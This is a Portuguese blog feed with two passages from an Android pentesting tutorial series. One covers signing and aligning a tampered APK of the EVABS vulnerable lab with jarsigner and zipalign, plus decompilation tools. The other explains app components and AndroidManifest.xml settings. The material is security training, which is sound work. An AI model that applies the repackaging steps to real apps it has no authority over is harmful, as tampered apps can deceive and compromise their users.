<p>Com a KeyStore e o par de chaves criados, é possível assinar o aplicativo adulterado com a ferramenta <code class="language-plaintext highlighter-rouge">jarsigner</code> existente na <code class="language-plaintext highlighter-rouge">build-tools</code> do <code class="language-plaintext highlighter-rouge">Android Studio</code>. O comando abaixo mostra o processo de assinatura.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jarsigner <span class="nt">-sigalg</span> SHA1withRSA <span class="nt">-digestalg</span> SHA1 <span class="nt">-keystore</span> h41stur.keystore EVABSv4_rebuild.apk h41stur
</code></pre></div></div>
<p>Onde:</p>

<ul>
  <li><strong>-sigalg</strong>: é o argumento para informar o algorítmo utilizado na assinatura;</li>
  <li><strong>-digestalg</strong>: é o argumento para informar o algorítmo utilizado na compilação do certificado;</li>
  <li><strong>-keystore</strong>: é o argumento para informar o caminho da KeyStore;</li>
</ul>

<p>Estes argumentos devem ser seguidos do caminho do APK a ser assinado e do alias do certificado.</p>

<p>Ao executar o comando, a senha do certificado será solicitada e o aplicativo será assinado com o certificado, conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-41.png" alt="Assinando o APK" title="Assinando o APK" /></p>

<p>É possível verificar a assinatura do APK com o argumento <code class="language-plaintext highlighter-rouge">-verify</code> conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-42.png" alt="Verificando assinatura" title="Verificando assinatura" /></p>

<p>Após este processo, o aplicativo ainda não está pronto, ainda é necessário fazer o alinhamento do arquivo compactado.</p>

<h3 id="zipalign">ZipAlign</h3>

<p>O <code class="language-plaintext highlighter-rouge">zipalign</code> é uma ferramenta que pode ser encontrada na <code class="language-plaintext highlighter-rouge">build-tools</code> do <code class="language-plaintext highlighter-rouge">Android Studio</code>. De acordo com sua <a href="https://developer.android.com/studio/command-line/zipalign">documentação</a>, esta ferramenta certifica que todos os arquivos descompactados no arquivo sejam alinhados em relação ao seu início, permitindo que todos estes arquivos possam ser acessados via <a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a>, eliminando a necessidade de copiar esses dados na RAM e reduzindo o uso de memória do seu aplicativo.</p>

<p>O comando abaixo mostra o processo de alinhamento do arquivo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zipalign <span class="nt">-v</span> 4 EVABSv4_rebuild.apk EVABSv4_alinhado.apk
</code></pre></div></div>
<p>Onde:</p>

<ul>
  <li><strong>-v</strong>: é o argumento para aumentar a verbosidade;</li>
  <li><strong>4</strong>: é o argumento para informar o alinhamento em bytes, no caso o <code class="language-plaintext highlighter-rouge">4</code> informa um alinhamento em <code class="language-plaintext highlighter-rouge">32 bits</code>.</li>
</ul>

<p>Após este processo, o aplicativo adulterado está pronto para ser instalado em um dispositivo físico ou emulado.</p>

<h2 id="jadx-gui">Jadx-gui</h2>

<p>Nem sempre a engenharia reversa precisa seguir até o nível mais baixo de código e bibliotecas, em uma situação de code review, a cenversão para o código fonte Java se torna suficiente para entendimento do aplicativo.</p>

<p>O <a href="https://github.com/skylot/jadx">jadx-gui</a> é um set de ferramentas de linha de comando e GUI que produzo códigos Java a partir de APKs e Android Dex.</p>

<p>Seu uso é simples, bastando chamar a ferramenta seguida do path do aplicativo a ser decompilado. A impagem abaixo mostra o aplicativo <a href="https://hakin9.org/evabs-extremely-vulnerable-android-labs/">EVABS (Extremaly Vulnerable Android Labs)</a> decompilado.</p>

<p><img src="/img/posts/mobile-43.png" alt="APK decompilado" title="APK decompilado" /></p>

<p>A partir desta fase, é possível fazer buscas no aplicativo por termos e funções chave.</p>

<p>É importante ressaltar, que na própria página da ferramenta, é explícito que sua eficácia não é de 100%, pois alguns pontos do aplicativo podem não ser decompilados.</p>

<h2 id="dex2jar">Dex2jar</h2>

<p>O <a href="https://github.com/pxb1988/dex2jar">dex2jar</a> faz parte de uma suite de ferramentas que tem pod objetivo trabalhar com extensões <code class="language-plaintext highlighter-rouge">.dex</code> os convertendo em classes Java.</p>

<p>Específicamente o <code class="language-plaintext highlighter-rouge">dex2jar</code> converte um aplicativo ou um código DEX em classes Java compactadas em um único arquivo <code class="language-plaintext highlighter-rouge">.jar</code> servindo com uma alternativa na decompilação de um aplicativo, uma vez que o resultado possa não ser 100% satisfatório entre uma ferramenta e outra.</p>

<p>Sua síntaxe é simples, bastando invocar a ferramenta seguida do path do aplicativo, após o processo, um arquivo com o sufixo <code class="language-plaintext highlighter-rouge">-dex2jar.jar</code> é gerado, conforme mostrado abaixo.</p>

<p><img src="/img/posts/mobile-44.png" alt="APK decompilado" title="APK decompilado" /></p>

<p>Para leitura do arquivo gerado é preciso utilizar uma aplicação que leia as classes Java, nestes artigos, usaremos o <a href="http://java-decompiler.github.io/">jd-gui</a>, uma ferramenta do <code class="language-plaintext highlighter-rouge">Java Decompiler project</code> que tem por objetivo desenvolver ferramentas para decompilar e analisar o Java byte-code.</p>

<p>Para efetuar a leitura, basta invocar o jd-gui seguido do path da classe gerada com o dex2jar. A imagem abaixo mostra como a leitura fica visível.</p>

<p><img src="/img/posts/mobile-45.png" alt="jd-gui" title="jd-gui" /></p>

<h2 id="enjarify">Enjarify</h2>

<p>O <a href="https://github.com/Storyyeller/enjarify">enjarify</a> assim como o dex2jar, é uma ferramenta para tradizid arquivos .dex e APKs em código Java, escritp em <code class="language-plaintext highlighter-rouge">Python</code> serve como mais uma alternativa para decompilação de aplicativos.</p>

<p>Sua sintaxe também é simples, bastando invocá-lo seguido do path do arquivo .dex ou APK. A imagem abaixo mostra este processo.</p>

<p><img src="/img/posts/mobile-46.png" alt="APK decompilado" title="APK decompilado" /></p>

<p>Ao final do processo, o enjarify também gera as classes Javas compactadas em um arquivo .jar, que pode ser aberto com o jd-gui.</p>

<h2 id="mobile-security-framework-mobsf">Mobile Security Framework (MobSF)</h2>

<p>O <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">Mobile Security Framework (MobSF)</a> é uma ferramenta “all-in-one” que faz todos os processos descritos neste post, desde a decompilação a code review. Além de permitir a análise tanto estática quanto dinâmica de um aplicativo.</p>

<p>Assim como as demais ferramentas, pode não trazer 100% de acerto, porém sua interface amigável e detalhada facilita a interpretação.</p>

<p>O demonstrativo abaixo, retirado do próprio GitHub <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" title="MobSF">MobSF</a> mostra o processo de engenharia reversa.</p>

<p><img src="https://user-images.githubusercontent.com/4301109/95506503-f9b6c980-097d-11eb-803a-f88321e1feb7.gif" alt="MobSF" title="MobSF" /></p>

<h1 id="conclusão">CONCLUSÃO</h1>

<p>Neste artigo, foi possível obter um overview do processo de engenharia reversa e adulteração de um aplicativo Android, foram vistas várias técnicas que podem se complementar, uma vez que nenhuma delas pode ser elencada como a definitiva.<br />
Nos próximos posts, entenderemos o processo de <code class="language-plaintext highlighter-rouge">hooking</code> de um aplicativo.</p>]]></content><author><name>H41stur</name></author><category term="Estudos" /><category term="Mobile" /><category term="Mobile" /><category term="Android" /><category term="Tools" /><category term="Eng. Reversa" /><category term="Assinatura" /><category term="Keytool" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/img/posts/android-logo.png" /><media:content medium="image" url="http://localhost:4000/img/posts/android-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting Android P.2 - Componentes de uma Aplicação</title><link href="http://localhost:4000/estudos/mobile/2022/06/10/mobile-2.html" rel="alternate" type="text/html" title="Pentesting Android P.2 - Componentes de uma Aplicação" /><published>2022-06-10T01:00:00-03:00</published><updated>2022-06-10T01:00:00-03:00</updated><id>http://localhost:4000/estudos/mobile/2022/06/10/mobile-2</id><content type="html" xml:base="http://localhost:4000/estudos/mobile/2022/06/10/mobile-2.html"><![CDATA[<p><img src="/img/posts/android-logo.png" alt="Pentesting Android" title="Pentesting Android" /></p>

<ul>
  <li><a href="#introdução">INTRODUÇÃO</a></li>
  <li><a href="#componentes-de-uma-aplicação-android">COMPONENTES DE UMA APLICAÇÃO ANDROID</a>
    <ul>
      <li><a href="#activities">Activities</a></li>
      <li><a href="#services">Services</a></li>
      <li><a href="#content-providers">Content Providers</a></li>
      <li><a href="#broadcast-receivers">Broadcast Receivers</a></li>
      <li><a href="#android-manifest">Android Manifest</a>
        <ul>
          <li><a href="#application-information">Application information</a></li>
          <li><a href="#user-permissions">User permissions</a></li>
          <li><a href="#components">Components</a></li>
          <li><a href="#components-resources">Components resources</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#anatomia-do-manifest">ANATOMIA DO MANIFEST</a></li>
  <li><a href="#intents-e-intent-filters">INTENTS E INTENT FILTERS</a></li>
  <li><a href="#conclusão">CONCLUSÃO</a></li>
</ul>

<h1 id="introdução">INTRODUÇÃO</h1>

<p>Dando continuidade aos artigos sobre pentesting mobile, como já vimos sobre elementos que fazem parte deste universo, agora vamos entender um pouco sobre o básico que compõe um aplicativo Android.</p>

<h1 id="componentes-de-uma-aplicação-android">COMPONENTES DE UMA APLICAÇÃO ANDROID</h1>

<p>Assim como qualquer programa, feito para qualquer sistema operacional, uma aplicação Android tem uma arquitetura específica que contém componentes específicos. Esta padronização permite que o desenvolvimento seja feito de forma a atender as especificações do SO.</p>

<p>Um aplicativo Android, ou um APK, nada mais é do que um arquivo compactado contendo toda a estrutura da aplicação, inclusive com um descompactador como <code class="language-plaintext highlighter-rouge">unzip</code> é possível descompactar o pacote e ter acesso a sua estrutura, porém, desta forma, a maior parte das informações estará criptografada.</p>

<p>Alguns compentes padrões em aplicações Android, são possíveis de se encontrar no <code class="language-plaintext highlighter-rouge">AndroidManigest.xml</code> que será abordado mais adiante. Porém, é de extrema importância que estes componetes sejam explanados.</p>

<h2 id="activities">Activities</h2>

<p>As <code class="language-plaintext highlighter-rouge">activities</code> nada mais são do que os pontos de interação de uma aplicação com o usuário, ou seja, toda tela da qual o usuário pode interagir, seja com botões, caixas de texto e demais interações.</p>

<p>Um exemplo abstrato seria de uma aplicação de mensagens, onde existe uma activiy para listar as mensagens recabidas, uma para abrir uma conversa, uma para digitar um texto. Sendo basicamente uma interface com o usuário.</p>

<h2 id="services">Services</h2>

<p>Os <code class="language-plaintext highlighter-rouge">services</code>, ou serviços, tem uma funcionalidade parecida com as activities, porém, não tem uma interface com o usuário, sendo executado geralmente em <em>background</em>.</p>

<p>Um exemplo abstrato seria em uma aplicação de monitoramento, como monitor de energia. Ele está sempre em execução, porém na maior parte do tempo sendo executado em <em>background</em> utilizando <code class="language-plaintext highlighter-rouge">services</code>. Quando é aberto para interação com o usuário, ele chama as <code class="language-plaintext highlighter-rouge">activities</code>.</p>

<h2 id="content-providers">Content Providers</h2>

<p>Os <code class="language-plaintext highlighter-rouge">content providers</code> são espaços de armazenamento que podem ser acessados como recuros de linguagem, semelhante a uma base de dados. Este componente é muito sensível em uma aplicação e será detalhado mais a frente.</p>

<h2 id="broadcast-receivers">Broadcast Receivers</h2>

<p>Os <code class="language-plaintext highlighter-rouge">broadcast receivers</code> são elementos de uma aplicação que fazem a comunicação com o próprio sistema e outras aplicações. Geralmente quando uma aplicação é instalada, ela solicita permissão para utilizar recursos como a câmera, telefone, armazenamento, entre outros. Esta comunicação com os demais recursos de um dispositivo é feita fia <code class="language-plaintext highlighter-rouge">broadcast receiver</code>.</p>

<h2 id="android-manifest">Android Manifest</h2>

<p>O <code class="language-plaintext highlighter-rouge">AndroindManifest.xml</code> é o arquivo principal dentro de um APK. Sendo armazenado na raíz do pacote, este arquivo contém basicamente tudo que uma aplicação está programada para fazer ou usar.</p>

<p>Este arquivo, também pode ser separado em partes:</p>

<h3 id="application-information">Application information</h3>

<p>Esta parte do AndroidManifest.xml contém os dados sobre a própria aplicação, como seu nome, a versão do SDK para qual foi feita, a versão mínima do SDK em que pode ser executado.</p>

<h3 id="user-permissions">User permissions</h3>

<p>Esta parte especifica todos os recursos do sistema que a aplicação precisa ter acesso, como internet, câmera, GPS.</p>

<p>Caso uma aplicação utilize um recurso que não esteja explícito nesta sessão do AndroidManifest.xml, o Google simplesmente não terá acesso a esta informação e este recurso não poderá ser utilizado. Pois o Android, utiliza esta sessão para demonstrar para o usuário, todos os recursos solicitados pela aplicação e solicitar sua permissão.</p>

<h3 id="components">Components</h3>

<p>Esta é a parte do AndroindManifest.xml que contém todos os componentes citados anteriormente, como as activities, services content providers e broadcast receivers.</p>

<h3 id="components-resources">Components resources</h3>

<p>Esta parte contém o direcionamento para recursos da aplicação como arquivos de imagem, xml contendo bibliotecas para a aplicação.</p>

<h1 id="anatomia-do-manifest">ANATOMIA DO MANIFEST</h1>

<p>Por se tratar de um arquivo <code class="language-plaintext highlighter-rouge">xml</code> o AndroidManifest.xml trabalha com <code class="language-plaintext highlighter-rouge">tags</code>. A tag principal, se chama <code class="language-plaintext highlighter-rouge">&lt;manifest ..&gt;</code> e um exemplo de sua sintaxe pode ser vista abaixo.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">"https://schemas.android.com/apk/res/android"</span>
    <span class="na">package=</span><span class="s">"string"</span>
    <span class="na">android:sharedUserId=</span><span class="s">"string"</span>
    <span class="na">android:sharedUserLabel=</span><span class="s">"string resource"</span>
    <span class="na">android:versionCode=</span><span class="s">"integer"</span>
    <span class="na">android:versionName=</span><span class="s">"string"</span>
    <span class="na">android:installLocation=</span><span class="s">["auto"</span> <span class="err">|</span> <span class="err">"internalOnly"</span> <span class="err">|</span> <span class="err">"preferExternal"]</span> <span class="nt">&gt;</span>
<span class="nt">&lt;/manifest&gt;</span>
</code></pre></div></div>
<p>É importante salientar que o parâmetro <code class="language-plaintext highlighter-rouge">package</code> dentro da tag principal, contém o nome da aplicação utilizado para referenciar os processos dentro do Android.</p>

<p>Outra tag utilizada é a <code class="language-plaintext highlighter-rouge">&lt;user-permission ...&gt;</code> que contém as permissões que a aplicação precisa para solicitar recursos do sistema. Esta tag fica dentro da tag <code class="language-plaintext highlighter-rouge">manifest</code>, alguns exemplos de sintaxe de permissão são:</p>

<ul>
  <li>android:name=”android.permission.CAMERA”</li>
  <li>android:name=”android.permission.ACCESS_FINE_LOCATION”</li>
  <li>android:name=”android.permission.READ_CONTACTS”</li>
</ul>

<p>Sua sintaxe é desta forma:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user-permission</span> <span class="na">android:name=</span><span class="s">"string"</span>
    <span class="na">android:maxSdkVersion=</span><span class="s">"integer"</span> <span class="nt">/&gt;</span>
</code></pre></div></div>

<p>Outra tag que está abaixo da tag <code class="language-plaintext highlighter-rouge">manifest</code> é a <code class="language-plaintext highlighter-rouge">&lt;application ...&gt;</code>. Esta tag contém muitas informações sobre o funcionamento da aplicação. Sua sintaxe é desta forma:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;application</span> <span class="na">android:allowTaskReparenting=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:allowBackup=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:allowClearUserData=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:allowNativeHeapPointerTagging=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:backupAgent=</span><span class="s">"string"</span>
             <span class="na">android:backupInForeground=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:banner=</span><span class="s">"drawable resource"</span>
             <span class="na">android:dataExtractionRules=</span><span class="s">"string resource"</span>
             <span class="na">android:debuggable=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:description=</span><span class="s">"string resource"</span>
             <span class="na">android:enabled=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:extractNativeLibs=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:fullBackupContent=</span><span class="s">"string"</span>
             <span class="na">android:fullBackupOnly=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:gwpAsanMode=</span><span class="s">["always"</span> <span class="err">|</span> <span class="err">"never"]</span>
             <span class="na">android:hasCode=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:hasFragileUserData=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:hardwareAccelerated=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:icon=</span><span class="s">"drawable resource"</span>
             <span class="na">android:isGame=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:killAfterRestore=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:largeHeap=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:label=</span><span class="s">"string resource"</span>
             <span class="na">android:logo=</span><span class="s">"drawable resource"</span>
             <span class="na">android:manageSpaceActivity=</span><span class="s">"string"</span>
             <span class="na">android:name=</span><span class="s">"string"</span>
             <span class="na">android:networkSecurityConfig=</span><span class="s">"xml resource"</span>
             <span class="na">android:permission=</span><span class="s">"string"</span>
             <span class="na">android:persistent=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:process=</span><span class="s">"string"</span>
             <span class="na">android:restoreAnyVersion=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:requestLegacyExternalStorage=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:requiredAccountType=</span><span class="s">"string"</span>
             <span class="na">android:resizeableActivity=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:restrictedAccountType=</span><span class="s">"string"</span>
             <span class="na">android:supportsRtl=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:taskAffinity=</span><span class="s">"string"</span>
             <span class="na">android:testOnly=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:theme=</span><span class="s">"resource or theme"</span>
             <span class="na">android:uiOptions=</span><span class="s">["none"</span> <span class="err">|</span> <span class="err">"splitActionBarWhenNarrow"]</span>
             <span class="na">android:usesCleartextTraffic=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
             <span class="na">android:vmSafeMode=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span> <span class="nt">&gt;</span>
    . . .
<span class="nt">&lt;/application&gt;</span>
</code></pre></div></div>
<p>Entre estas informações, duas são muito importantes de se observar:</p>

<ul>
  <li>android:allowBackup</li>
  <li>android:debuggable</li>
</ul>

<p>A tag <code class="language-plaintext highlighter-rouge">activity</code> contém, conforme explicado anteriormente, contém todas as interfaces com o usuário. Sua sintaxe dentro do AndroidManifest.xml é desta formaa;</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;activity</span> <span class="na">android:allowEmbedded=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:allowTaskReparenting=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:alwaysRetainTaskState=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:autoRemoveFromRecents=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:banner=</span><span class="s">"drawable resource"</span>
          <span class="na">android:clearTaskOnLaunch=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:colorMode=</span><span class="s">[</span> <span class="err">"hdr"</span> <span class="err">|</span> <span class="err">"wideColorGamut"]</span>
          <span class="na">android:configChanges=</span><span class="s">["mcc",</span> <span class="err">"mnc",</span> <span class="err">"locale",</span>
                                 <span class="err">"touchscreen",</span> <span class="err">"keyboard",</span> <span class="err">"keyboardHidden",</span>
                                 <span class="err">"navigation",</span> <span class="err">"screenLayout",</span> <span class="err">"fontScale",</span>
                                 <span class="err">"uiMode",</span> <span class="err">"orientation",</span> <span class="err">"density",</span>
                                 <span class="err">"screenSize",</span> <span class="err">"smallestScreenSize"]</span>
          <span class="na">android:directBootAware=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:documentLaunchMode=</span><span class="s">["intoExisting"</span> <span class="err">|</span> <span class="err">"always"</span> <span class="err">|</span>
                                  <span class="err">"none"</span> <span class="err">|</span> <span class="err">"never"]</span>
          <span class="na">android:enabled=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:excludeFromRecents=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:exported=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:finishOnTaskLaunch=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:hardwareAccelerated=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:icon=</span><span class="s">"drawable resource"</span>
          <span class="na">android:immersive=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:label=</span><span class="s">"string resource"</span>
          <span class="na">android:launchMode=</span><span class="s">["standard"</span> <span class="err">|</span> <span class="err">"singleTop"</span> <span class="err">|</span>
                              <span class="err">"singleTask"</span> <span class="err">|</span> <span class="err">"singleInstance"</span> <span class="err">|</span> <span class="err">"singleInstancePerTask"]</span>
          <span class="na">android:lockTaskMode=</span><span class="s">["normal"</span> <span class="err">|</span> <span class="err">"never"</span> <span class="err">|</span>
                              <span class="err">"if_whitelisted"</span> <span class="err">|</span> <span class="err">"always"]</span>
          <span class="na">android:maxRecents=</span><span class="s">"integer"</span>
          <span class="na">android:maxAspectRatio=</span><span class="s">"float"</span>
          <span class="na">android:multiprocess=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:name=</span><span class="s">"string"</span>
          <span class="na">android:noHistory=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>  
          <span class="na">android:parentActivityName=</span><span class="s">"string"</span> 
          <span class="na">android:persistableMode=</span><span class="s">["persistRootOnly"</span> <span class="err">|</span> 
                                   <span class="err">"persistAcrossReboots"</span> <span class="err">|</span> <span class="err">"persistNever"]</span>
          <span class="na">android:permission=</span><span class="s">"string"</span>
          <span class="na">android:process=</span><span class="s">"string"</span>
          <span class="na">android:relinquishTaskIdentity=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:resizeableActivity=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:screenOrientation=</span><span class="s">["unspecified"</span> <span class="err">|</span> <span class="err">"behind"</span> <span class="err">|</span>
                                     <span class="err">"landscape"</span> <span class="err">|</span> <span class="err">"portrait"</span> <span class="err">|</span>
                                     <span class="err">"reverseLandscape"</span> <span class="err">|</span> <span class="err">"reversePortrait"</span> <span class="err">|</span>
                                     <span class="err">"sensorLandscape"</span> <span class="err">|</span> <span class="err">"sensorPortrait"</span> <span class="err">|</span>
                                     <span class="err">"userLandscape"</span> <span class="err">|</span> <span class="err">"userPortrait"</span> <span class="err">|</span>
                                     <span class="err">"sensor"</span> <span class="err">|</span> <span class="err">"fullSensor"</span> <span class="err">|</span> <span class="err">"nosensor"</span> <span class="err">|</span>
                                     <span class="err">"user"</span> <span class="err">|</span> <span class="err">"fullUser"</span> <span class="err">|</span> <span class="err">"locked"]</span>
          <span class="na">android:showForAllUsers=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:stateNotNeeded=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:supportsPictureInPicture=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:taskAffinity=</span><span class="s">"string"</span>
          <span class="na">android:theme=</span><span class="s">"resource or theme"</span>
          <span class="na">android:uiOptions=</span><span class="s">["none"</span> <span class="err">|</span> <span class="err">"splitActionBarWhenNarrow"]</span>
          <span class="na">android:windowSoftInputMode=</span><span class="s">["stateUnspecified",</span>
                                       <span class="err">"stateUnchanged",</span> <span class="err">"stateHidden",</span>
                                       <span class="err">"stateAlwaysHidden",</span> <span class="err">"stateVisible",</span>
                                       <span class="err">"stateAlwaysVisible",</span> <span class="err">"adjustUnspecified",</span>
                                       <span class="err">"adjustResize",</span> <span class="err">"adjustPan"]</span> <span class="nt">&gt;</span>   
    . . .
<span class="nt">&lt;/activity&gt;</span>
</code></pre></div></div>
<p>A tag <code class="language-plaintext highlighter-rouge">&lt;service ...&gt;</code> assim como já dito, contém os services da aplicação. Sua sintaxe é desta forma:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;service</span> <span class="na">android:description=</span><span class="s">"string resource"</span>
         <span class="na">android:directBootAware=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
         <span class="na">android:enabled=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
         <span class="na">android:exported=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
         <span class="na">android:foregroundServiceType=</span><span class="s">["camera"</span> <span class="err">|</span> <span class="err">"connectedDevice"</span> <span class="err">|</span>
                                        <span class="err">"dataSync"</span> <span class="err">|</span> <span class="err">"location"</span> <span class="err">|</span> <span class="err">"mediaPlayback"</span> <span class="err">|</span>
                                        <span class="err">"mediaProjection"</span> <span class="err">|</span> <span class="err">"microphone"</span> <span class="err">|</span> <span class="err">"phoneCall"]</span>
         <span class="na">android:icon=</span><span class="s">"drawable resource"</span>
         <span class="na">android:isolatedProcess=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
         <span class="na">android:label=</span><span class="s">"string resource"</span>
         <span class="na">android:name=</span><span class="s">"string"</span>
         <span class="na">android:permission=</span><span class="s">"string"</span>
         <span class="na">android:process=</span><span class="s">"string"</span> <span class="nt">&gt;</span>
    . . .
<span class="nt">&lt;/service&gt;</span>
</code></pre></div></div>
<p>A tag <code class="language-plaintext highlighter-rouge">&lt;provider ...&gt;</code> contém os content providers. Um ponto interessante desta tag, é o parâmetro <code class="language-plaintext highlighter-rouge">exported</code>, pois se estiver marcado como <code class="language-plaintext highlighter-rouge">true</code>, isso significa que aplicações externas podem interagir com ele. Sua sintaxe é desta forma:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;provider</span> <span class="na">android:authorities=</span><span class="s">"list"</span>
          <span class="na">android:directBootAware=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:enabled=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:exported=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:grantUriPermissions=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:icon=</span><span class="s">"drawable resource"</span>
          <span class="na">android:initOrder=</span><span class="s">"integer"</span>
          <span class="na">android:label=</span><span class="s">"string resource"</span>
          <span class="na">android:multiprocess=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:name=</span><span class="s">"string"</span>
          <span class="na">android:permission=</span><span class="s">"string"</span>
          <span class="na">android:process=</span><span class="s">"string"</span>
          <span class="na">android:readPermission=</span><span class="s">"string"</span>
          <span class="na">android:syncable=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:writePermission=</span><span class="s">"string"</span> <span class="nt">&gt;</span>
    . . .
<span class="nt">&lt;/provider&gt;</span>
</code></pre></div></div>

<p>A tag receiver contém os broadcast receivers, esta tag mostra todas as permissões que a applicação tem para receber informações sistêmicas e de outras aplicações. Sua sintaxe é:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;receiver</span> <span class="na">android:directBootAware=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:enabled=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:exported=</span><span class="s">["true"</span> <span class="err">|</span> <span class="err">"false"]</span>
          <span class="na">android:icon=</span><span class="s">"drawable resource"</span>
          <span class="na">android:label=</span><span class="s">"string resource"</span>
          <span class="na">android:name=</span><span class="s">"string"</span>
          <span class="na">android:permission=</span><span class="s">"string"</span>
          <span class="na">android:process=</span><span class="s">"string"</span> <span class="nt">&gt;</span>
    . . .
<span class="nt">&lt;/receiver&gt;</span>
</code></pre></div></div>

<h1 id="intents-e-intent-filters">INTENTS E INTENT FILTERS</h1>

<p>Os <code class="language-plaintext highlighter-rouge">intents</code> são um recurso da aplicação que fornece um meio de comunicação com outros recursos do dispsitivo. De forma análoga ao nome, o intent expressa uma “intenção” de utilização de recursos do dispositivo.</p>

<p>Uma intent pode ser usada para chamar uma outra activity, um serviço pra rodar em background ou para entregar um recurso via broadcast.</p>

